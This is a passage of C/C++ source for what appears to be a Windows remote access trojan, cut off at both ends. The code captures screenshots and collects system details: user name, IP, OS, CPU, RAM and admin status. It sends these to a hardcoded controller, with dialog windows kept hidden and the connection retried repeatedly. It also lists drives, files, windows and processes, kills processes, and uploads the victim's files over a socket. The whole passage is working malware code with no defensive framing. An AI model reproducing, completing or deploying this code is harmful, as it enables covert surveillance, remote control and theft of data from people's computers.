      f[(j++)+df+3]+=(*(ux++))*q[3];
     }
    }
    else iFor (3) {
     f[j+i]+=(*ux)*qy[0];
     f[j+df+i]+=(*(ux++))*qy[1];
    }
    if (nx>=a->x) nx-=a->x;
     if (!nx) j+=3;
   }
  }
  else {
   For (x,a->x) {

    nx+=bx;

    if (nx>a->x) {
     qx[0]=1-(qx[1]=(nx-a->x)/(float)bx);
     iFor (3) {
      f[j]+=(*ux)*qx[0];
      f[(j++)+3]+=(*(ux++))*qx[1];
     }
    }
    else iFor (3) f[j+i]+=*(ux++);

    if (nx>=a->x) nx-=a->x;
     if (!nx) j+=3;
   }
   if (ny<a->y) j-=df;
  }
  if (ny>=a->y) ny-=a->y;
 }

 nf=0;
 k=bx*by/(float)(a->x*a->y);
 uy=b->b;

 For (y,by) {
  jFor (df) uy[j]=f[nf++]*k+.5;
  uy+=b->l;
 }

 free (f);
}

HBITMAP ShrinkBitmap (HBITMAP a,WORD bx,WORD by)
// creates and returns new bitmap with dimensions of
// [bx,by] by shrinking bitmap a both [bx,by] must be less or equal
// than the dims of a, unless the result is nonsense
{
 tWorkBMP in,out;
 HBITMAP b=CreateEmptyBitmap(bx,by);
 OpenBitmapForWork (a,&in);
 ShrinkWorkingBitmap (&in,&out,bx,by);
 free (in.b);
 SaveWorkingBitmap (&out,b);
 free (out.b);
 return (b);
}
LPPICTURE gpPicture;


int GetEncoderClsid(WCHAR *format, CLSID *pClsid)
{
    unsigned int num = 0,  size = 0;
    GetImageEncodersSize(&num, &size);
    if(size == 0) return -1;
    ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
    if(pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for(unsigned int j = 0; j < num; ++j)
	{
        if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }    
    }
    free(pImageCodecInfo);
    return -1;
}
int SCREENX = 0;
int SCREENY = 0;

int SCREENXX = 0;
int SCREENYY = 0;
HBITMAP hbmCaptureB;
int GetScreeny(LPWSTR lpszFilename, ULONG uQuality, int X, int Y)
{
//Top:
    ULONG_PTR gdiplusToken;
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    HDC hdcScreen  = CreateDC("DISPLAY", NULL, NULL, NULL);
    HDC hdcCapture = CreateCompatibleDC(hdcScreen);
    int nWidth     = GetDeviceCaps(hdcScreen, HORZRES),
        nHeight    = GetDeviceCaps(hdcScreen, VERTRES),
        nBPP       = GetDeviceCaps(hdcScreen, BITSPIXEL);
    
    LPBYTE lpCapture;
    BITMAPINFO bmiCapture = { {
        sizeof(BITMAPINFOHEADER), SCREENX, SCREENY, 1, nBPP, BI_RGB, 0, 0, 0, 0, 0,
    } };
    HBITMAP hbmCapture = CreateDIBSection(hdcScreen, &bmiCapture,
        DIB_PAL_COLORS, (LPVOID *)&lpCapture, NULL, 0);
    if(!hbmCapture)
	{
        DeleteDC(hdcCapture);
        DeleteDC(hdcScreen);
        GdiplusShutdown(gdiplusToken);
        return 1;
    }
    
    int nCapture = SaveDC(hdcCapture);
    SelectObject(hdcCapture, hbmCapture);
    BitBlt(hdcCapture, 0, 0, SCREENX, SCREENY , hdcScreen, 0, 0, SRCCOPY);
    RestoreDC(hdcCapture, nCapture);
    DeleteDC(hdcCapture);
    DeleteDC(hdcScreen);
    
    if(hbmCaptureB == hbmCapture)
	{
	return FALSE;
	}
	else
	{
	hbmCaptureB = hbmCapture;
	}
    CLSID imageCLSID;

    Bitmap *pScreenShot = new Bitmap(ShrinkBitmap (hbmCapture,X ,Y ), (HPALETTE)NULL);
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid  = EncoderQuality;
    encoderParams.Parameter[0].Type  = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &uQuality;
    GetEncoderClsid(L"image/jpeg", &imageCLSID);
    int result = (pScreenShot->Save(lpszFilename, &imageCLSID, &encoderParams) == Ok);
    delete pScreenShot;
    DeleteObject(hbmCapture);
    GdiplusShutdown(gdiplusToken);
    SCREENXX = X;
    SCREENYY = Y;
    return result;
}

////////////////////////////////////////////////////////////////////////////
//Screen Res
void ScreenRes()
{
   //width
   int x = GetSystemMetrics(SM_CXSCREEN);
   if(x == 0)
   {
    lstrcpy(ResultRes, "X Failed!");
   }
   // height
    y = GetSystemMetrics(SM_CYSCREEN);
    if(y == 0)
   {
	lstrcpy(ResultRes, "Y Failed!");
   }

ZeroMemory(&ResultRes[0],100);
SCREENX = x;
SCREENY = y;
wsprintf(&ResultRes[0],"%d x %d", x, y);
lstrcpy(Head.Buf, ResultRes);
}
//////////////////////////////////////////////////////////////////////////////
//Check NT based.
bool GetOSVersion()
{
PGNSI pGNSI;
bool bOsVersionInfoEx;
bool ntOS;

OSVERSIONINFOEX osvi; SYSTEM_INFO si;
ZeroMemory(&si, sizeof(SYSTEM_INFO));
ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

if(!(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)))
{
osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
if (!GetVersionEx( (OSVERSIONINFO *) &osvi) )
return false;
}

// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.
pGNSI = (PGNSI) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");

 if(pGNSI != NULL)
 {
 pGNSI(&si);
 }
 else
 {
 GetSystemInfo(&si);
 }

switch(osvi.dwPlatformId)
{ // Test for the Windows NT or 9x product family.
   case VER_PLATFORM_WIN32_NT:
	   {
        if(osvi.dwMajorVersion == 5 || osvi.dwMajorVersion == 6) // winXP or Vista
        ntOS = true;
	   }
       break;
}

return ntOS;
}
//////////////////////////////////////////////
//Get Total Memory.
void GetTotalRAM()
{
	MEMORYSTATUS Status;
	ZeroMemory(&Status, sizeof(Status));
	Status.dwLength = sizeof(Status);
	GlobalMemoryStatus(&Status);
	DWORD dwRAM = (DWORD)(Status.dwTotalPhys / (1024*1024));
	lstrcpy(Buffer, "");
	wsprintf(Buffer, "%d MB", dwRAM);
	lstrcpy(Head.Data, Buffer);
	ZeroMemory(Buffer, 64);
}
/////////////////////////////////////////////////
//get CPU info
void GetProcessor()
{
char  CPUkey [100] = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
char  CPUVal [100] = "ProcessorNameString";
char CPU [100] = "";
HKEY key1;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
int result;
char* buf = (char*)malloc(100);

if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,CPUkey,0,KEY_READ, &key1) == ERROR_SUCCESS)
{
RegQueryValueEx(key1,CPUVal, NULL, NULL, NULL, &dataSize);
realloc(buf, dataSize);

result = RegQueryValueEx(key1,CPUVal, NULL, NULL, (PBYTE)buf, &dataSize);
if(result == ERROR_SUCCESS)
{
lstrcpy(Head.Buf3, buf);
}

}

RegCloseKey(key1);
Sleep(1000);
}



bool GetCompInfo(bool ntOS)
{
// holds win9x and XP info paths
	const char * KeyNT = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\";

// holds query paths
char keyNtName[6][100] = { "ProductName","CSDVersion"};

// used to hold grabbed data
char* buf = (char*)malloc(100);

HKEY key1;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
int result;

// if were running under win 2k, XP or Vista
if(ntOS == true)
{

  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,KeyNT,0,KEY_READ, &key1) == ERROR_SUCCESS)
  {

	for(int i = 0; i < 2; i++) 
	{
	RegQueryValueEx(key1,keyNtName[i], NULL, NULL, NULL, &dataSize);
	realloc(buf, dataSize);

	result = RegQueryValueEx(key1,keyNtName[i], NULL, NULL, (PBYTE)buf, &dataSize);
		if(result == ERROR_SUCCESS && i == 0)
		{
		lstrcpy(Head.Threads, "");
		lstrcpy(Head.Threads, buf);
		Sleep(100);
		}
		else
		{
	    lstrcat(Head.Threads, " / ");
		lstrcat(Head.Threads, buf); 
		}

	}

  RegCloseKey(key1);
  }
}




return true;
}

void GetUserInfo()
{
char ret[100];

char host[100];
gethostname(host, sizeof(host));


DWORD nUserName = sizeof(UserName);
GetUserName(UserName, &nUserName);

wsprintf(ret," %s",UserName);
lstrcpy(Head.PID, ret);
lstrcpy(UserName, Head.PID);
}

void Getcountry()
{
	
      WORD wVersionRequested;
      WSADATA wsaData;
      char name[255];
      char * ip;
//	  char * ServiceName;
      PHOSTENT hostinfo;
      wVersionRequested = MAKEWORD( 2, 0 );

      if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
      {

            if( gethostname ( name, sizeof(name)) == 0)
            {
				//(NULL, name, "name", MB_OK);
                  if((hostinfo = gethostbyname(name)) != NULL)
                  {
                        ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
                  }
            }

            WSACleanup( );
      }
///////////////////////////////////////////////////////////////////////////////////////
//
	sprintf(Country, "%s / %s", ip, name);
	lstrcpy(Head.PRIORITY, Country);
    /*GetLocaleInfo(LOCALE_SYSTEM_DEFAULT,LOCALE_SENGCOUNTRY,Country,128);
     */  
}
void serverVersion()
{
lstrcpy(Head.ParentPID, ServerVersion);
}

BOOL IsAdmin()
{
UINT i;
bool bRetval = FALSE;
BOOL bSuccess;
HANDLE hAccessToken;
UCHAR InfoBuffer[1024];
PTOKEN_GROUPS ptgGroups = (PTOKEN_GROUPS) InfoBuffer;
DWORD dwInfoBufferSize;
PSID psidAdministrators;
SID_IDENTIFIER_AUTHORITY siaNtAuthority = SECURITY_NT_AUTHORITY;
OSVERSIONINFO Info = {0};
Info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

if (GetVersionEx(&Info))
{
	if ((Info.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)&&(Info.dwMajorVersion==4))
	{
	return TRUE;
	}

}
else
{
return FALSE;
}
if (!OpenThreadToken(GetCurrentThread(),TOKEN_QUERY,TRUE,&hAccessToken))
{ 
   if (GetLastError() != ERROR_NO_TOKEN)
	{
	return FALSE;
	}

   if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hAccessToken))
   {
	return FALSE;
   }
}
bSuccess = GetTokenInformation(hAccessToken,TokenGroups,InfoBuffer, sizeof(InfoBuffer),&dwInfoBufferSize);

CloseHandle(hAccessToken);
if (!bSuccess)
{
return FALSE;
}
if (!AllocateAndInitializeSid(&siaNtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&psidAdministrators))
{
return FALSE;
}
	for (i = 0; i < ptgGroups->GroupCount; i++) 
	{
		if (EqualSid(psidAdministrators,ptgGroups->Groups[i].Sid))
		{
		bRetval = TRUE;
		break;
		}
	}
FreeSid(psidAdministrators);
return bRetval;
}
 
int Admin()
{
char ADMIN [100] = "";
if (IsAdmin())
{
lstrcpy(Head.Buf2, "Administrator");
} 
else
{
 lstrcpy(Head.Buf2, "Not Administrator");
}

return 0;
}

void systeminfo()
{
Sleep(100);
ScreenRes();
Admin();
GetProcessor();
GetTotalRAM();
GetUserInfo();
Getcountry();
bool isNT = GetOSVersion();
GetCompInfo(isNT);
serverVersion();
lstrcpy(Head.IDS, "");
wsprintf(Head.IDS, "%d", LocalId);
Head.PacketType = PACKET_USER_JOINED;
send(client,(char *)&Head, sizeof(Head), 0);
}
///////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////
//Create Socket.
void InitWSA()
{
	WORD	wVersionRequested;
	WSADATA wsaData;
	int		err;
	wVersionRequested = MAKEWORD( 2, 0 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
		PostQuitMessage(1);

    if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 )
	{
	    WSACleanup();
		PostQuitMessage(0);
	}
}

void CloseSocket()
{
	closesocket(client);
	WSACleanup();
}
//////////////////////////////////////////////////////////////////////////////////////
//File Manager Functions
int ListDir(char dir[1024]) 
{
   WIN32_FIND_DATA ffd;
   LARGE_INTEGER filesize;
   TCHAR szDir[MAX_PATH];
   HANDLE hFind = INVALID_HANDLE_VALUE;
   DWORD dwError=0;
	char FileExtention [10] = "";;
	int C = 0;
	int H = 0;
	char BufferAB [100] = "";
   lstrcpy(szDir, dir);
   lstrcat(szDir, "*");
   wsprintf(BufferAB, "%d", LocalId);

    hFind = FindFirstFile(szDir, &ffd);
	if(hFind == NULL)
	{
	
	}
   
   if (INVALID_HANDLE_VALUE == hFind) 
   {
	// MessageBox(NULL, "Invalid Handle (hFind)", "List Find Next File", MB_OK);
     return 1;
   } 
   
   // List all the files in the directory with some info about them.

   do
   {
      if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
      {
		 lstrcpy(Head.Data,ffd.cFileName); 
		 Head.PacketType = PACKET_FILE_MANAGER_FILE;
		 Head.ID = LocalId;
		 Head.ID2 = 2;
		 Head.ID3 = 8;
         send(client,(char*)&Head,HeadSize,0);
		 Sleep(10);

      }
      else
      {
		  
         filesize.LowPart = ffd.nFileSizeLow;
         filesize.HighPart = ffd.nFileSizeHigh;
		 C = 0;
		 H = 0;
		 Head.ID3 = 0;
		 lstrcpy(Head.Data, ffd.cFileName);

         ZeroMemory(&Head.ParentPID[0],20);
         wsprintf(&Head.ParentPID[0],"%d Bytes",filesize.QuadPart);
         while(Head.Data[C] != '.')
		 {
		 C++;
		 }
		 while(Head.Data[C] != NULL)
		 {
		 FileExtention[H] += Head.Data[C];
		 H++;
		 C++;
		 }
		 if(strstr(FileExtention, ".exe") || strstr(FileExtention, ".EXE") || strstr(FileExtention, ".com") || strstr(FileExtention, ".COM"))
		 {
		 Head.ID3 = 10;
		 goto send;
		 }
		 if(strstr(FileExtention, ".jpg"))
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".PNG") || strstr(FileExtention, ".png") )
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".jpeg") || strstr(FileExtention, ".JPEG"))
		 {
		  Head.ID3 = 13;
		  goto send;
		 }
		 if(strstr(FileExtention, ".ico") || strstr(FileExtention, ".ICO"))
		 {
		  Head.ID3 = 13;
		  goto send;
		 }
		 if(strstr(FileExtention, ".BMP") || strstr(FileExtention, ".bmp"))
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".GIF") || strstr(FileExtention, ".gif"))
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".pif") || strstr(FileExtention, ".pif"))
		 {
		 Head.ID3 = 13;
		 goto send;
		 }
		 if(strstr(FileExtention, ".txt") || strstr(FileExtention, ".doc") || strstr(FileExtention, ".DOC") || strstr(FileExtention, ".TXT") || strstr(FileExtention, ".log") || strstr(FileExtention, ".LOG"))
		 {
		  Head.ID3 = 14;
		  goto send;
		 }
		 if(strstr(FileExtention, ".mp3") || strstr(FileExtention, ".MP3") || strstr(FileExtention, ".mp4") || strstr(FileExtention, ".MP4"))
		 {
		  Head.ID3 = 12;
		  goto send;
		 }
		 if(strstr(FileExtention, ".AVI") || strstr(FileExtention, ".avi") || strstr(FileExtention, ".mpg") || strstr(FileExtention, ".mpeg") || strstr(FileExtention, ".MPEG") || strstr(FileExtention, ".wmv") || strstr(FileExtention, ".WMV"))
		 {
		 Head.ID3 = 15;
		 goto send;
		 }
		if(strstr(FileExtention, ".rar") || strstr(FileExtention, ".RAR") || strstr(FileExtention, ".zip") || strstr(FileExtention, ".ZIP"))
		{
		Head.ID3 = 11;
		goto send;
		}
		 else
		 {
		 Head.ID3 = 9;
		 goto send;
		 }
send:
		 ZeroMemory(&FileExtention[0],10); 
		 Head.PacketType = PACKET_FILE_MANAGER_FILE;
		 Head.ID2 = 1;
		 send(client, (char*)&Head, sizeof(Head), 0);
		 ZeroMemory(&Head.Data[0], sizeof(Head.Data));
		 /*		 
		 ZeroMemory(&Head.PID,20);
         wsprintf(&Head.PID[0],"%d",ffd.ftCreationTime);
		 MessageBox(NULL, Head.PID, "Creationtime", MB_OK);

		 ZeroMemory(&Head.PRIORITY,20);
         lstrcpy(&Head.PRIORITY[0], ffd.ftLastAccessTime);
		 MessageBox(NULL, Head.PRIORITY, "AccessTime", MB_OK);

		 ZeroMemory(&Head.Threads,20);
         wsprintf(&Head.Threads,"%s",ffd.ftLastWriteTime);
		 MessageBox(NULL, Head.Threads, "WriteTime", MB_OK);*/
		 Sleep(1);
	 }

   }while (FindNextFile(hFind, &ffd) != 0);
 
   dwError = GetLastError();
   if (dwError != ERROR_NO_MORE_FILES) 
   {
	   Sleep(100);
   }

   FindClose(hFind);
   return 0;
}


void SendDrives()
{
UINT driveType = 0;
char drive[4] = "A:\\";
char finaldrive [20] ="";

for(drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++) 
{
switch(GetDriveType(drive)) 
{
case DRIVE_REMOVABLE: // The drive has removable media
Head.ID2 = 2;
lstrcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_REMOTE: // The drive is a remote (network) drive.
Head.ID2 = 4;
lstrcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_UNKNOWN: // The drive type cannot be determined.
lstrcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_FIXED: // The drive has fixed media
Head.ID2 = 1;
lstrcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_CDROM: // The drive is a CD-ROM drive.
Head.ID2 = 3;
lstrcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

case DRIVE_RAMDISK: // The drive is a RAM disk.
Head.ID2 = 5;
lstrcpy(Head.Data, drive);
Head.PacketType = PACKET_FILE_MANAGER_DRIVE;
Head.ID = LocalId;
send(client,(char*)&Head,HeadSize,0);
break;

default:
break;
}
}
return;
}
//////////////////////////////////////////////////////////////////////////////////////////////
//Task manager Functions.

HWND GetFirstWindowText(char buf[],unsigned int max_out,int *text_written)
{
     HWND ret_val;
     ret_val = GetForegroundWindow();
     if(!text_written) GetWindowText(ret_val,buf,max_out);
     else *text_written = GetWindowText(ret_val,buf,max_out);
     return ret_val;
}

int GetNextWindowText(char buf[],unsigned int max_out,HWND* handle)
{
    *handle = GetNextWindow(*handle,GW_HWNDNEXT);
    return GetWindowText(*handle,buf,max_out);
}

BOOL ShowTasks(int ID)
{     HWND Windows;
      char Data[265];
     
     Windows = GetFirstWindowText(Data, sizeof(Data), 0);
TryAgain:
      lstrcpy(Head.Data, Data);
	  Head.PacketType=PACKET_TASK_MANAGER_TASKS;
	  Head.ID = LocalId;
	  if(send(client,(char*)&Head,HeadSize,0) == SOCKET_ERROR)
	  {
		  if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
			{
			return 0;
			}

	  goto TryAgain;
	  }
	 //MessageBox(NULL, Head.Data, "Head.Data", MB_OK); 
     while(Windows)
     {
        GetNextWindowText(Data, sizeof(Data), &Windows);
        
        if(*Data && IsWindowVisible(Windows))
        {
TryAgainA:
             lstrcpy(Head.Data, Data);
		   	 Head.PacketType=PACKET_TASK_MANAGER_TASKS;
	         Head.ID = LocalId;
	       if(send(client,(char*)&Head,HeadSize,0) == SOCKET_ERROR)
		   {
			   if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
				{
					return 0;
				}

		   goto TryAgainA;
		   }	
		   //MessageBox(NULL, Head.Data, "Head.Data", MB_OK);
        }
     }
	return TRUE;
}
int SendTask(int ID)
{
	int Priority = 0;
    HANDLE Snap;
    PROCESSENTRY32 proc32;
	MEMORYSTATUS Memory;

Snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//take a snap of all processes
  
  if(Snap==INVALID_HANDLE_VALUE)
  {
    return EXIT_FAILURE;
  }
  
  proc32.dwSize=sizeof(PROCESSENTRY32); //set size of structure
  
  while((Process32Next(Snap,&proc32))==TRUE)//while we haven't reached the final process
  {
     lstrcpy(Head.Data, proc32.szExeFile);
	  
	 ZeroMemory(&Head.PID[0],sizeof(Head.PID));
     wsprintf(&Head.PID[0],"%d",proc32.th32ProcessID);

	 ZeroMemory(&Head.Threads[0],sizeof(Head.Threads));
     wsprintf(&Head.Threads[0],"%d",proc32.cntThreads);
	 
     ZeroMemory(&Head.ParentPID[0],sizeof(Head.ParentPID));
     wsprintf(&Head.ParentPID[0],"%d",proc32.th32ParentProcessID);
	 
	 Priority = proc32.pcPriClassBase;

	 if(Priority > 7 && Priority < 12)
	 {
		lstrcpy(Head.PRIORITY, "Normal");
	 }
	 if(Priority < 7)
	 {
		lstrcpy(Head.PRIORITY, "Low");
	 }
	 if(Priority > 12)
	 {
		lstrcpy(Head.PRIORITY, "High");
	 }
	TryAgain:
    Head.PacketType=PACKET_TASK_MANAGER;
	Head.ID = LocalId;

	GlobalMemoryStatus(&Memory);
	sprintf(Head.Buf, "%d", Memory.dwMemoryLoad);

	//MessageBox(NULL, Head.Buf, "Head.Buf", MB_OK);

	if(send(client,(char*)&Head,HeadSize,0) == SOCKET_ERROR)
	{
	if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
	{
	return 0;
	}

	goto TryAgain;
	}
	Sleep(5);
  }
  return 0;
}
BOOL KillProcess(char *Process)
{
     int result;
	 Head.ID = LocalId;
     HANDLE hProcessSnap = 0;
	 HANDLE hProcess = 0;
	 HANDLE hSnapshot = 0;
	 PROCESSENTRY32 pe32;
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     
     pe32.dwSize = sizeof(PROCESSENTRY32);
         
     Process32First(hProcessSnap, &pe32);
         
     while(Process32Next(hProcessSnap, &pe32))
     {
        if(!strcmp(pe32.szExeFile, Process))
        {
           result = 1;
                                   
           hProcess = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
           
           if(TerminateProcess(hProcess, 0) == 0)
           {
              //MessageBox(NULL, "Terminating process failed !", "KillProcess", MB_OK | MB_ICONERROR);
           }
           
           else
           {
            
           }
        }
     }
         
     CloseHandle(hProcess);
     CloseHandle(hProcessSnap);
     
     if(result == 0)
     //MessageBox(NULL, "Process cannot be found !", "KillProcess", MB_OK | MB_ICONWARNING);
     
     result = 0;
	return TRUE;
}      
/////////////////////////////////////////////////////////////////////////////////////////

LRESULT CALLBACK FileWndProc(HWND hwnd,UINT Mes,WPARAM wParam,LPARAM lParam)
{
int ConRes = 0;
int Result = 0;
char * ip;
bool ConnectL = 0;
WORD wVersionRequested;
WSADATA wsaData;
PHOSTENT hostinfo;
wVersionRequested = MAKEWORD( 2, 0 );
switch(Mes)
	{
case WM_INITDIALOG: 
	  if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
      {
            if((hostinfo = gethostbyname(IP)) != NULL)
              {
              ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
              }

            WSACleanup( );
			//MessageBox(NULL, ip, "ip", MB_OK);
      }
		ShowWindow(hwnd,SW_HIDE);
		if(!ConnectL)
		{
		ConnectL = 1;
		InitWSA();
        begin:
		RemAdress.sin_family = AF_INET;
		RemAdress.sin_addr.s_addr=inet_addr(ip);
		RemAdress.sin_port = htons (atoi(FPORT));
		FClient = socket (AF_INET,SOCK_STREAM,0);
	    ConRes=connect (FClient, (struct sockaddr *)&RemAdress,sizeof(RemAdress));
			if (ConRes==-1)
			{
			 goto begin;
			}
			WSAAsyncSelect(FClient,hwnd,RATMSG_SOCKET,FD_READ|FD_CLOSE|FD_CONNECT);
		}
		else
		{
		break;
		}
		break;

		case WM_PAINT: 
		if (!IsHiddenAlready)
		{
			ShowWindow(hwnd,SW_HIDE);
			IsHiddenAlready^=1;
		}
		break;
	case RATMSG_SOCKET:
		LEvent=WSAGETSELECTEVENT(lParam);
		switch(LEvent)
		{
		case FD_CONNECT:
			//MessageBox(NULL, "Connection", "Connected", MB_OK);
			break;
		case FD_CLOSE:
		
			WSACleanup();
			closesocket(client);
				/*ExitProcess(0);
			    EndDialog(hwnd, Event);
		    	PostQuitMessage(0);*/
			
			break;
		case FD_READ:
         recv(FClient,(char*)&FRecv,FRecvSize,0);    
		 switch (FRecv.PacketType)
			{
               case PACKET_FILE_MANAGER_FILE_RECV:
				   // MessageBox(NULL, FRecv.Data, "FRecv.Data", MB_OK);
				   
				   if(fd[FRecv.ID2] == NULL)
				   {
					break;
				   }

					fwrite(FRecv.Data, FRecv.ID3, 1, fd[FRecv.ID2]);
					break;
		       case PACKET_FILE_MANAGER_FILE_C:
				    if(fd[FRecv.ID2] == NULL)
				   {
				break;
				   }
					fclose(fd[FRecv.ID2]);
					fd[FRecv.ID2] = 0;
					break;
			}

	
		  
		}

		break;
	}
return 0;
}
DWORD WINAPI FILERECV(LPVOID lpParam)
{
    File=CreateDialog(GInstance,(LPCTSTR)IDC_FILE,NULL,(DLGPROC)FileWndProc);
	ShowWindow(File,SW_HIDE);

	MSG msg;
	while(GetMessage(&msg,File,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}
void Connection(HWND hwnd)
{
      WORD wVersionRequested;
      WSADATA wsaData;
      char * ip = "";
      PHOSTENT hostinfo;
      wVersionRequested = MAKEWORD( 2, 0 );
int ConRes = 0;
char Buffer [20] = "";
	  if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
      {
                  if((hostinfo = gethostbyname(IP)) != NULL)
                  {
                        ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
                  }
		//MessageBox(NULL, ip, "ip", MB_OK);
      }
		InitWSA();
        begin:
		Sleep(1000);
		RemAdr.sin_family = AF_INET;
		RemAdr.sin_addr.s_addr=inet_addr(ip);
		RemAdr.sin_port = htons (atoi(PORT));
		client = socket (AF_INET,SOCK_STREAM,0);
	    ConRes=connect (client, (struct sockaddr *)&RemAdr,sizeof(RemAdr));
			if (ConRes==-1)
			{
			 //MessageBox(NULL, "ConRes==-1", "ConRes==-1", MB_OK);
			 goto begin;
			}
		else
		{
		
		WSAAsyncSelect(client,hwnd,RATMSG_SOCKET,FD_READ|FD_CLOSE|FD_CONNECT);
		}
	return;
}
int ID2;
int ID3;
char FileBuf[1024] = "";

DWORD WINAPI SendFile(LPVOID lpParam)
{
  
	PACKETFILE		File;
	DWORD			FileSize=sizeof(PACKETFILE);
	
	char FileNameBuf [40] = "";
	strcpy(FileNameBuf, (char *)lpParam);
	//MessageBox(NULL, FileNameBuf, "FileNameBuf", MB_OK);
	int d = ID2;
	int T = 0;
	FILE * Down;
	char FilePath [1024] = "";
	strcpy(FilePath, FileBuf);
	int Error = 0;
	char IDA[10] = "";
	unsigned long int pos = 0;
	unsigned long int length = 0;
	unsigned long int Nsize = 0;
	unsigned long int NextSize = 0;
	int ItemIndex = Recv.ID3;
	char UPBUF [30] = "";
	
	Down = fopen(FilePath, "rb");
	if(Down == NULL)
	{
		sprintf(File.Data,"Failed to open %s, %s not found.", FileNameBuf);	
		File.ID3 = ItemIndex;
		File.ID = LocalId;
		File.PacketType = PACKET_FILE_MANAGER_FILE_UPDATE_WIN;
		send(FClient, (char *)&File, sizeof(PACKETFILE), 0);
		
		return 1;
	}
	else
	{
	}
    pos = ftell(Down);
    fseek(Down, 0, SEEK_END);
    length = ftell(Down);      
    fseek(Down, pos, SEEK_SET);
	
	
	NextSize = length - Nsize;
	ZeroMemory(UPBUF, sizeof(UPBUF));
	sprintf(UPBUF,"length: %d", length);			
	
	
	
	while(Nsize < length)
	{
		ZeroMemory(&File, sizeof(PACKETFILE));
		NextSize = length - Nsize;
		sprintf(File.Data,"%d Bytes / %d Bytes", Nsize, length);	
		File.ID3 = ItemIndex;
		File.ID = LocalId;
		File.PacketType = PACKET_FILE_MANAGER_FILE_UPDATE_WIN;
		
        if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
		{
			Sleep(1000);	
		}
		ZeroMemory(&File, sizeof(PACKETFILE));
		
		if(NextSize < sizeof(File.Data))
		{
			fread(File.Data, 1, NextSize, Down);
SendAgain4k:
			File.ID2 = d;
			File.ID3 = NextSize;                                 
			File.PacketType = PACKET_FILE_MANAGER_FILE_RECV;
			if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
			{
				Sleep(1000);
				goto SendAgain4k;
			}
			break;
		}
		
		fread(File.Data, 1, sizeof(File.Data), Down);
SendAgain:
		File.ID2 = d;
		File.ID3 = sizeof(File.Data);                                 
		File.PacketType = PACKET_FILE_MANAGER_FILE_RECV;
		
		
        if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
		{
			Sleep(1000);
			goto SendAgain;
		}
		
		Nsize += sizeof(File.Data);
		//percent+=unit;
	}
	
	
	fclose(Down);
	ZeroMemory(UPBUF, sizeof(UPBUF));
